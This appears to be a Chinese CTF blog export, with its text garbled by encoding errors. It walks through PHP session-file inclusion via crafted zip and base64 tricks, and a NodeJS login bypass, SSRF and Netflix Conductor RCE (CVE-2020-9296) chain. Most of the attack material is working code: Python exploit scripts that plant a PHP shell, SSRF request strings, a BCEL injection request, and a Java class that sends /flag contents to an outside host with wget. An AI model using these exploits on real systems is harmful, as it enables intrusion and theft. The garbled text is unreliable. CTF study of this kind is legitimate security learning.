å…¶ä¸­åŒ…å«äº†æ–‡ä»¶å¤´ï¼Œæ–‡ä»¶æ•°æ®ï¼Œæ•°æ®æè¿°ç¬¦ï¼ˆè¿™é‡Œæ²¡æœ‰ï¼‰ æ–‡ä»¶å¤´çš„ç»“æ„å¦‚ä¸‹ï¼š æ–‡ä»¶æ•°æ®éƒ¨åˆ†è®°å½•äº†å‹ç¼©æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œç¤ºä¾‹zipåŒ…ä¸­æ²¡æœ‰æ•°æ®æè¿°ç¬¦ï¼Œç”¨äºæ ‡è¯†æ–‡ä»¶å‹ç¼©ç»“æŸï¼Œç£ç›˜ä¸Šçš„zipæ–‡ä»¶é€šå¸¸æ²¡æœ‰è¿™ä¸ªéƒ¨åˆ† ç¬¬äºŒéƒ¨åˆ†çœ‹æ ¸å¿ƒç›®å½•åŒºï¼Œç”±æ ¸å¿ƒç›®å½•æ–‡ä»¶å¤´ï¼ˆ0x02014b50)åˆ°æ ¸å¿ƒç›®å½•ç»“æŸæ ‡å¿—ï¼ˆ0x06054b50ï¼‰ 12345600000080 50 4b 01 02 1e 03 0a 00 00 00 00 00 | PK..........|00000090 45 bc f2 52 19 fa 6f fc 41 00 00 00 41 00 00 00 |E..R..o.A...A...|000000a0 09 00 18 00 00 00 00 00 01 00 00 00 a4 81 00 00 |................|000000b0 00 00 73 68 65 6c 6c 2e 70 68 70 55 54 05 00 03 |..shell.phpUT...|000000c0 f2 49 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.I.&#96;ux..........|000000d0 03 00 00 |... ç¬¬ä¸‰éƒ¨åˆ†å°±æ˜¯End of central directory record(EOCD) ç›®å½•ç»“æŸæ ‡è¯† 12000000d0 50 4b 05 06 00 00 00 00 01 00 01 00 4f | PK..........O|000000e0 00 00 00 84 00 00 00 00 00 |.........| 0x03 éé¢„æœŸè§£é¢˜ç›®çš„æ€è·¯æ— éå°±æ˜¯é€šè¿‡PHP_SESSION_UPLOAD_PROGRESSå˜é‡æ„é€ ä¸€ä¸ªZIPåŒ…ï¼Œä½†æ˜¯å†™è¿›sessionçš„æ—¶å€™ï¼Œå˜é‡å‰é¢ä¼šæœ‰ä¸€ä¸ªå‰ç¼€ï¼Œçœ‹é…ç½®çŸ¥é“æ˜¯upload_progress_ï¼Œæ‰€ä»¥ç°åœ¨é—®é¢˜æ˜¯ï¼Œå¦‚ä½•åœ¨è¿™ä¸ªå‰ç¼€å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œä½¿å¾—æˆ‘ä»¬çš„zipè¯»å–ä¸ä¼šå‡ºé—®é¢˜ éé¢„æœŸè§£åŸç†æ˜¯ï¼Œzipçš„å‰26ä¸ªå­—èŠ‚ï¼ˆç›´åˆ°é•¿åº¦ä½éƒ¨åˆ†ï¼‰çš„æ”¹åŠ¨æ˜¯ä¸ä¼šå½±å“æˆ‘ä»¬zip://åè®®å¯¹æ–‡ä»¶çš„è¯»å–ï¼Œæ‰€ä»¥è§£æ³•æ˜¯ï¼Œupload_progress_é•¿åº¦ä¸º16ï¼Œåˆ é™¤zipåŒ…å¼€å¤´ç›¸ç­‰é•¿åº¦éƒ¨åˆ†ï¼Œå°†å‰©ä½™éƒ¨åˆ†ä½œä¸ºPHP_SESSION_UPLOAD_PROGRESSå˜é‡çš„å€¼ä¼ å…¥ï¼Œå†ç”¨zipåè®®è¯»å– expï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8import requestsimport ioimport osimport threadingimport syspoc = &#x27;&#x27;&#x27;@&lt;?phpecho &quot;nappingC4t&quot;;system(&#x27;whoami&#x27;);?&gt;&#x27;&#x27;&#x27;f = open(&#x27;./shell.php&#x27;,&#x27;w&#x27;)f.write(poc)f.close()os.system(&#x27;rm -rf ./shell.zip;zip shell.zip shell.php&#x27;)f = open(&#x27;./shell.zip&#x27;,&#x27;rb&#x27;)ZipContent = f.read()f.close()#print(ZipContent)def get_payload(prefix): offset = len(prefix) return ZipContent[offset:] #æˆªæ–­å‰é¢éƒ¨åˆ†å­—èŠ‚ prefix = b&#x27;upload_progress_&#x27;payload = get_payload(prefix)#print(payload)url = &#x27;http://127.0.0.1/1.php&#x27;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27;*1024*1024) r = session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:payload&#125;, files=&#123;&#x27;file&#x27;:(&#x27;1.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;C4t&#x27;&#125;)def read(session): while True: url = &#x27;http://127.0.0.1/1.php?yxxx=zip:///tmp/sess_C4t&#x27;+&#x27;%23&#x27;+&#x27;shell&#x27; r = session.post(url,data=&#123;&#125;) if &#x27;nappingC4t&#x27; in r.text: print(r.text) event.clear() sys.exit()event = threading.Event()with requests.session() as session: threading.Thread(target=write,args=(session,)).start() threading.Thread(target=read,args=(session,)).start()event.set() 0x04 é¢„æœŸè§£æ„é€ ç•¸å½¢zip: æ›´æ”¹æ ¸å¿ƒç›®å½•çš„42åˆ°46ä½ï¼ˆæœ¬åœ°æ–‡ä»¶å¤´çš„åç§»ï¼‰ï¼Œå’Œæ›´æ”¹ç›®å½•ç»“æŸæ ‡å¿—çš„16åˆ°20ä½ï¼ˆæ ¸å¿ƒç›®å½•å¼€å§‹ä½ç½®ç›¸å¯¹äºarchiveçš„ä½ç§»ï¼‰ï¼ŒåŠ ä¸Šupload_progress_çš„é•¿åº¦å³å¯ è¿™æ ·è¯»å–çš„æ—¶å€™å°±å¯ä»¥æ— è§†å‰ç¼€äº† exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#encoding:utf-8import ioimport osimport threadingimport sysfrom pwn import *poc = &#x27;&#x27;&#x27;@&lt;?phpecho &quot;nappingC4t&quot;;system(&#x27;whoami&#x27;);?&gt;&#x27;&#x27;&#x27;f = open(&#x27;shell.php&#x27;,&#x27;w&#x27;)f.write(poc)f.close()os.system(&#x27;rm -rf ./shell.zip;zip shell.zip shell.php&#x27;)f = open(&#x27;shell.zip&#x27;,&#x27;rb&#x27;)ZipContent = f.read()f.close()#print(ZipContent)central_directory_idx = ZipContent.index(b&#x27;\\x50\\x4b\\x01\\x02&#x27;)end_of_central_directory_idx = ZipContent.index(b&#x27;\\x50\\x4b\\x05\\x06&#x27;)#local file header + file data + data descriptorlfd = ZipContent[:central_directory_idx]#æ ¸å¿ƒç›®å½•central_directory = ZipContent[central_directory_idx:end_of_central_directory_idx]#ç»“å°¾end_central_directory = ZipContent[end_of_central_directory_idx:]def get_payload(offset): header_offset = u32(central_directory[42:46]) archive_offset = u32(end_central_directory[16:20]) return lfd + central_directory[:42] + p32(header_offset+offset) + central_directory[46:] + end_central_directory[:16] + p32(archive_offset+offset) + end_central_directory[20:]prefix = &#x27;upload_progress_&#x27;payload = get_payload(len(prefix))url = &#x27;http://127.0.0.1/1.php&#x27;sessid = &#x27;c4t&#x27;def write(session): f = io.BytesIO(b&#x27;a&#x27;*1024*1024) session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:payload&#125;, files=&#123;&#x27;file&#x27;:(&#x27;1.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;)def read(session): r = session.post(url=&#x27;http://127.0.0.1/1.php?yxxx=zip:///tmp/sess_&#x27;+sessid+&#x27;%23&#x27;+&#x27;shell&#x27;, data=&#123;&#125;) if &#x27;nappingC4t&#x27; in r.text: print(r.text) event.clear() sys.exit(0)event = threading.Event()with requests.session() as session: threading.Thread(target=write, args=(session,)).start() threading.Thread(target=read, args=(session,)).start()event.set() 0x05 hitcon2018 One Line PHP Challengeé¢˜ç›®ä¹Ÿæ˜¯ä¸€å¥è¯ 12&lt;?php ($_=@$_GET[&#x27;orange&#x27;]) &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@&lt;?php&#x27; ? include($_) : highlight_file(__FILE__); ä¸ä¸Šé¢ä¸åŒçš„åœ°æ–¹ï¼Œå°±æ˜¯æ²¡æœ‰é™å®šåŒ…å«æ–‡ä»¶çš„åç¼€ï¼Œåªé™å®šäº†å†…å®¹ è¿™é‡Œæ²¡æœ‰phpinfoï¼Œæ— æ³•é€šè¿‡åŒ…å«ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶æ–‡ä»¶æ‹¿åˆ°shellï¼Œä¸Šé¢é‚£é¢˜phpinfoæ˜¯å†™æ­»çš„ï¼Œä¹Ÿä¸èƒ½ è¿™é¢˜è¿˜æ˜¯åŒ…å«sessionæ–‡ä»¶ï¼Œè§£å†³å‰ç¼€çš„é—®é¢˜æ˜¯é€šè¿‡base64å¤šæ¬¡è§£å¯†æ¶ˆé™¤å‰ç¼€ åŸç†æ˜¯ï¼Œå¯¹äºä¸åœ¨base64ç¼–ç å­—ç¬¦é›†å†…çš„å­—ç¬¦ï¼Œè§£ç çš„æ—¶å€™ä¼šå¿½ç•¥ï¼Œæ‰€ä»¥ï¼Œå¤šæ¬¡è§£å¯†åå¯èƒ½ä¼šå¾—åˆ°è§£å¯†ç»“æœä¸ºç©ºçš„æƒ…å†µï¼Œåˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œç»“åˆphp://åè®®å¯¹ä»sessionæ–‡ä»¶é€šè¿‡å¤šæ¬¡è§£å¯†è¯»å‡ºæ¥å°±å¯ä»¥æ¶ˆé™¤å‰ç¼€å¯¹æˆ‘ä»¬çš„å½±å“äº† éœ€è¦æ³¨æ„çš„é—®é¢˜æ‰€åœ¨ï¼š 1.bas64è§£å¯†æ˜¯ä»¥4ä¸ªå­—ç¬¦ä¸€ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªå‰ç¼€ï¼ˆæ„é€ çš„æ–¹å¼å°±æ˜¯åœ¨åŸæ¥å‰ç¼€åæ·»åŠ éšæœºçš„å­—ç¬¦ï¼‰ï¼Œæ»¡è¶³ï¼š æœ‰é™æ¬¡è§£å¯†ä¹‹åä¸ºç©º æ¯æ¬¡è§£å¯†å¾—åˆ°çš„ç»“æœä¸­æœ‰æ•ˆå­—ç¬¦ï¼ˆåœ¨å­—ç¬¦é›†ä¸­çš„å­—ç¬¦ï¼‰å¿…é¡»æ˜¯4çš„æ•´æ•°ï¼Œé˜²æ­¢ä¸å¤Ÿ4ä¸ªä¸€ç»„å½±å“æˆ‘ä»¬åé¢çš„çœŸæ­£çš„payloadéƒ¨åˆ† è§£ç è¿‡ç¨‹ä¸­ä¸èƒ½å‡ºç°=ï¼Œå¯¹äºbase64æ¥è¯´ï¼Œç­‰å·åªä¼šå‡ºç°åœ¨æœ€åé¢ï¼Œåœ¨ä¸­é—´å‡ºç°ä¼šè®©æ¥ä¸‹æ¥çš„è§£ç å‡ºé”™ 2.æˆ‘ä»¬çš„payloadï¼Œå³è„šæœ¬ä¸­çš„pocéƒ¨åˆ†ï¼Œéœ€è¦è¿›è¡ŒæŒ‡å®šæ¬¡æ•°çš„base64-encodeï¼Œè¿™ä¸ªencodeçš„è¿‡ç¨‹ä¹Ÿä¸èƒ½å‡ºç°=ï¼Œåœ¨sessionæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æ„é€ çš„éƒ¨åˆ†æ•°æ®æ˜¯å¤„äºä¸­é—´ä½ç½®ï¼Œä¸­é—´ä½ç½®å°±ä¸èƒ½å‡ºç°=ï¼Œå¦‚ä½•è®©=ä¸å‡ºç°ï¼Œå¾ˆç®€å•ï¼Œåªè¦æ»¡è¶³è¿™æ ·çš„æ¡ä»¶ï¼š å› ä¸ºåŠ å¯†è¿‡ç¨‹æ˜¯3ä¸ªå­—ç¬¦ä¸€ç»„ï¼ŒåŠ å¯†å3ä¸ªå­—ç¬¦ä¼šå˜æˆ4ä¸ªå­—ç¬¦ï¼Œ=çš„å‡ºç°æ˜¯åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦ä¸æ˜¯3çš„å€æ•°ï¼Œæˆ‘ä»¬åªè¦æ„é€ é•¿åº¦ä¸º3çš„å€æ•°å³å¯ï¼ŒåŠ å¯†næ¬¡çš„è¯ï¼Œå°±æ„é€ é•¿åº¦ä¸º3^nçš„å€æ•°ï¼Œåœ¨åŸæœ¬çš„payloadåæ·»åŠ ä»»æ„å­—ç¬¦å³å¯ 3.å¯èƒ½åœ¨è§£å¯†è¿‡ç¨‹ä¸­sessionæ–‡ä»¶åé¢éƒ¨ä»½ï¼Œå¹¶ä¸æ˜¯å…¨éƒ¨å¯æ§çš„éƒ¨åˆ†ï¼Œå¯èƒ½ä¼šå‡ºç°=ï¼Œä¼šå¯¼è‡´è§£ç å¤±è´¥ï¼Œè¿™ç§æƒ…å†µå°è¯•æ›´æ”¹æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„å‚æ•°ï¼Œæ¯”å¦‚æ–‡ä»¶åï¼Œæ–‡ä»¶é•¿åº¦ä¹‹ç±»çš„ã€‚å¤šè¯•å‡ é exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#coding=utf-8import ioimport requestsimport base64import randomimport sysimport threadingprefix = &#x27;upload_progress_&#x27;alphabet = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;def valid_for_b64(str): len = 0 for i in str: if &#x27;%s&#x27; %i in alphabet: len += 1 return lendef test(str): temp_str = str t = 0 while (valid_for_b64(temp_str))%4 == 0 and len(temp_str) !=0: try: temp_str = base64.b64decode(temp_str) t += 1 except Exception as e: #print(e) return False if b&#x27;=&#x27; in temp_str: return False if len(temp_str) == 0: return (True,t) else: return Falsedef get_payload(str): ext_num = 4-(valid_for_b64(str)%4) while True: temp_str = str for i in range(ext_num): temp_str = temp_str + random.choice(alphabet) result=test(temp_str) if result != False: return (temp_str,result[1]) else: continueresult = get_payload(prefix)new_prefix = result[0]decode_times = result[1]print(&quot;[*]éœ€è¦decodeçš„æ¬¡æ•°ï¼š%i&quot;%decode_times)poc = b&#x27;&#x27;&#x27;@&lt;?phpecho &quot;nappingC4t&quot;;system(&#x27;whoami&#x27;);?&gt;&#x27;&#x27;&#x27;def get_b64_poc(poc): poc_ext = 3**decode_times-(len(poc)%(3**decode_times)) poc = poc + b&#x27;a&#x27;*poc_ext for i in range(decode_times): poc = base64.b64encode(poc) return pocpoc = get_b64_poc(poc)payload = new_prefix[-2:] + str(poc, encoding=&#x27;utf8&#x27;)print(&quot;[*]PHP_SESSION_UPLOAD_PROGRESSï¼š%s&quot;% payload)def write(session): url = &#x27;http://127.0.0.1/1.php&#x27; f = io.BytesIO(b&#x27;b&#x27;*1024*100) while True: session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:payload&#125;, files=&#123;&#x27;file&#x27;:(&#x27;ccc.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;c4t&#x27;&#125;)def read(session): url = &#x27;http://127.0.0.1/1.php?orange=php://filter/&#x27;+&#x27;convert.base64-decode|&#x27;*(decode_times-1)+&#x27;convert.base64-decode/resource=/tmp/sess_c4t&#x27; while True: r = session.post(url,data=&#123;&#125;) if &#x27;nappingC4t&#x27; in r.text: print(r.text) event.clear() sys.exit(0)event = threading.Event()with requests.session() as session: threading.Thread(target=write, args=(session,)).start() threading.Thread(target=read, args=(session,)).start()event.set()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"zipä¼ªåè®®","slug":"zipä¼ªåè®®","permalink":"https://123-prog.github.io/tags/zip%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"åŒ…å«sessionæ–‡ä»¶getshell","slug":"åŒ…å«sessionæ–‡ä»¶getshell","permalink":"https://123-prog.github.io/tags/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6getshell/"},{"name":"ç•¸å½¢zip","slug":"ç•¸å½¢zip","permalink":"https://123-prog.github.io/tags/%E7%95%B8%E5%BD%A2zip/"}]},{"title":"è™ç¬¦CTF 2021 Internal System","slug":"è™ç¬¦CTF-2021-Internal-System","date":"2021-07-14T04:10:59.000Z","updated":"2021-09-22T09:52:43.787Z","comments":true,"path":"2021/07/14/è™ç¬¦CTF-2021-Internal-System/","link":"","permalink":"https://123-prog.github.io/2021/07/14/%E8%99%8E%E7%AC%A6CTF-2021-Internal-System/","excerpt":"0x01 NodeJSä»£ç å®¡è®¡/source","text":"0x01 NodeJSä»£ç å®¡è®¡/source 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149const express = require(&#x27;express&#x27;)const router = express.Router()const axios = require(&#x27;axios&#x27;)const isIp = require(&#x27;is-ip&#x27;)const IP = require(&#x27;ip&#x27;)const UrlParse = require(&#x27;url-parse&#x27;)const &#123;sha256, hint&#125; = require(&#x27;./utils&#x27;)const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;))const port = process.env.PORT || 3000function formatResopnse(response) &#123; if(typeof(response) !== typeof(&#x27;&#x27;)) &#123; return JSON.stringify(response) &#125; else &#123; return response &#125;&#125;function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125;const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]router.get(&#x27;/&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/index&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.render(&#x27;index&#x27;, &#123;admin: req.session.admin, network: JSON.stringify(require(&#x27;os&#x27;).networkInterfaces())&#125;) &#125;&#125;)router.get(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) &#123; res.render(&#x27;base&#x27;, &#123;title: &#x27;WAF&#x27;, content: &quot;Here is the waf...&quot;&#125;) &#125; else &#123; try &#123; const response = await axios.get(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, response.data) &#125; catch(error) &#123; res.render(&#x27;base&#x27;, error.message) &#125; &#125;&#125;)router.post(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, &quot;Something needs to be implemented&quot;)&#125;)router.all(&#x27;/search&#x27;, async (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;You can only use proxy to aceess here!&#x27;&#125;) &#125; const result = &#123;title: &#x27;Search Success&#x27;, content: &#x27;&#x27;&#125; const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try &#123; if(method == &#x27;get&#x27;) &#123; const response = await axios.get(url) result.content = formatResopnse(response.data) &#125; else if(method == &#x27;post&#x27;) &#123; const response = await axios.post(url, data) result.content = formatResopnse(response.data) &#125; else &#123; result.title = &#x27;Error&#x27; result.content = &#x27;Unsupported Method&#x27; &#125; &#125; catch(error) &#123; result.title = &#x27;Error&#x27; result.content = error.message &#125; return res.json(result)&#125;)router.get(&#x27;/source&#x27;, (req, res, next)=&gt;&#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.js&quot;);&#125;)router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;)module.exports = router ç¬¬ä¸€æ­¥ï¼Œä»¥adminèº«ä»½ç™»å½•ï¼Œå…¶éªŒè¯çš„æ–¹æ³•æ˜¯ 12345678910111213router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;) adminHashå®šä¹‰ä¸º 1const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;)) åœ¨æ»¡è¶³æ¡ä»¶!username || !password || username === password || username.length === password.length || username === &#39;admin&#39;çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨æ•°ç»„å’Œå­—ç¬¦ä¸²å¯æ‹¼æ¥çš„ç‰¹ç‚¹ï¼Œå¦‚ ç»•è¿‡payload: 1&#x2F;login?username[]&#x3D;admin&amp;password&#x3D;admin è·³è½¬åˆ°/index 0x02å®¡æŸ¥æºç ï¼Œåœ¨è·¯ç”±/flagä¸‹å­˜åœ¨ä¸€ä¸ªhintï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ç›®æ ‡æ˜¯è®¿é—®åˆ°/flag è·¯ç”±/search,/flagéƒ½åªèƒ½æœ¬åœ°è®¿é—®ï¼Œ/proxyæ˜¯ä¸€ä¸ªä»£ç†è®¿é—®ï¼Œå¯ä»¥åšSSRFçš„åˆ©ç”¨ ä½†æ˜¯/proxyä¸‹å­˜åœ¨è¿‡æ»¤ 1234567891011121314function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125; SSRF_WAFå¯ä»¥ç”¨0.0.0.0ç»•è¿‡ï¼ŒFLAG_WAFå½¢åŒè™šè®¾ï¼Œå¤§å†™ç»•è¿‡ï¼Œæˆ–è€…è®¿é—®åˆ°/searchï¼Œé€šè¿‡/searchè®¿é—®/flag 12&#x2F;proxy?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;Flag æˆ–&#x2F;proxy?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;search?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;flag å¾—åˆ°æç¤º åœ¨å†…ç½‘çš„å…¶ä»–ä¸»æœºä¸Šè¿è¡Œç€Netflix ConductoræœåŠ¡ï¼Œé‚£æ¥ä¸‹æ¥å°±è‚¯å®šæ‰“è¿™ä¸ªæœåŠ¡äº† 0x03å‰é¢ç™»å½•æˆåŠŸçš„æ—¶å€™æ˜¯å·²ç»ç»™äº†å½“å‰ä¸»æœºçš„ç½‘ç»œä¿¡æ¯ï¼ŒNetflix ConductoræœåŠ¡ç«¯å£å·æ˜¯8080ï¼Œçˆ†ç ´ä¸€ä¸‹å­ç½‘å†…çš„ä¸»æœº 1&#x2F;proxy?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;search?url&#x3D;http:&#x2F;&#x2F;10.0.85.x:8080 åœ¨10.0.85.9ä¸»æœºä¸Š æ˜¯ä¸ªswagger UI ,apiæ¥å£æ–‡æ¡£ é€šè¿‡è®¿é—®/api/swagger.jsonå¯ä»¥å¾—åˆ°æ¥å£çš„åˆ—è¡¨ æ–¹ä¾¿æŸ¥çœ‹ï¼Œå¯ä»¥åœ¨æœ¬åœ°æ­ä¸€ä¸ªswagger UIï¼ˆhttps://petstore.swagger.io/ï¼‰ ,å¯¼å…¥ä¸Šé¢æ‹¿åˆ°çš„æ¥å£åˆ—è¡¨ æ¥å£/api/admin/configæŸ¥çœ‹ç‰ˆæœ¬ä¸º2.26.0 æ¼æ´åˆ©ç”¨ CVE-2020-9296-Netflix-Conductor-RCE https://xz.aliyun.com/t/7889#toc-3 cveè®°å½•çš„ç‰ˆæœ¬å·æ˜¯åˆ°2.25.0ï¼Œä½†è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ æ¼æ´åˆ©ç”¨å¾ˆç®€å•ï¼Œåœ¨/api/metadata/taskdefsï¼ŒPOSTä¸€ä¸ªjsonï¼Œåœ¨jsonä¸­æ’å…¥æ¶æ„BCELç¼–ç ï¼Œå°±å¯ä»¥å®ç°RCE 1234567891011121314151617181920212223curl -X POST \\ http:&#x2F;&#x2F;localhost:8080&#x2F;api&#x2F;metadata&#x2F;taskdefs \\ -H &#39;Content-Type: application&#x2F;json&#39; \\ -d &#39;[ &#123; &quot;name&quot;: &quot;$&#123;&#39;1&#39;.getClass().forName(&#39;com.sun.org.apache.bcel.internal.util.ClassLoader&#39;).newInstance().loadClass(&#39;BCEL&#39;).newInstance().class&#125;&quot;, &#x2F;&#x2F;åˆ©ç”¨ç‚¹åœ¨nameè¿™é‡Œ,com.sun.org.apache.bcel.internal.util.ClassLoaderåŠ è½½classé€šè¿‡BCEL &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 300, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 180 &#125;, &#123; &quot;name&quot;: &quot;add_idents&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 300, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 180 &#125;]&#39; 0x04å‡†å¤‡ä¸€ä¸ªæ¶æ„ç±» Evil.java 12345678910111213public class Evil&#123; public Evil()&#123; try&#123; String[] command &#x3D; &#123; &quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, &quot;wget http:&#x2F;&#x2F;vps:port?a&#x3D;&#96;cat &#x2F;flag&#96;&quot;&#125;; Runtime.getRuntime().exec(command); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(final String[]array)&#123; &#125;&#125; ä½¿ç”¨javac Evil.javaç¼–è¯‘ç”ŸæˆEvil.class ä½¿ç”¨è¿™ä¸ªå·¥å…·GitHub - f1tz/BCELCodeman: BCEL encode/decode manager for fastjson payloads å°†classæ–‡ä»¶è½¬ç æˆBCELç¼–ç  æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨æ¼æ´éœ€è¦çš„POSTè¯·æ±‚ä¸º 12345POST &#x2F;api&#x2F;metadata&#x2F;taskdefs HTTP&#x2F;1.1Host: 10.0.85.9:8080Content-Type: application&#x2F;json[&#123;&quot;name&quot;: &quot;$&#123;&#39;1&#39;.getClass().forName(&#39;com.sun.org.apache.bcel.internal.util.ClassLoader&#39;).newInstance().loadClass(&#39;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbR$gA$U$3d$3d$e0$M$OCx$J$J$e6$F$ba$Q$b4$8a$B$rI$V$e4$b1H$99$V$89$v$b1t$e1$86fl$b1$R$Gjh$d4$85$ff$93$b5$h$92r$e1$H$e4$a3$a2$b7$tU$nUIW$f5$e9$be$e7$9e$3e$f7v$f7$cf_$b7w$A$gX$b7$R$c3$8a$8d$i$f21$3c$d6$eb$T$L$F$hKX$b5$f0$d4$c23$G$f3$ad$f4$a5z$cf$Q$vW$O$Z$a2$l$c7$t$82$n$d9$96$be$f82$h$f5Dp$c0$7bCb$S$j$c5$bd$f3$cf$7c$S$c6$e1$e9$C$c9G$5c$fa$M$f9$f2q$7b$c0$_$b8$3b$e4$7e$df$ed$a8$40$fa$fd$96$b6$b3$3b$e3Y$e0$89OR$5b$y$ef$5e$c8aU$eb$i$y$c3$b6$f0$dc$c1$L$bcd$d8$b9$ec$LU$3cSj$d2t$dd$fav$bd$ba$f3$a6Z$afU$b7_5$9a$f5Z$ad$f6$81$bf$ebz$5c$V$dd$d3$n$ef_$f7$f8T$bcnt$j$UQb$c8$$$ca$ee$5eyb$a2$e4$d8w$b0$G$9bz$d3$e5$YR$L$c5$5eo$m$3c$c5$90$5eP$fb3_$c9$R5gS$L$7f$82$5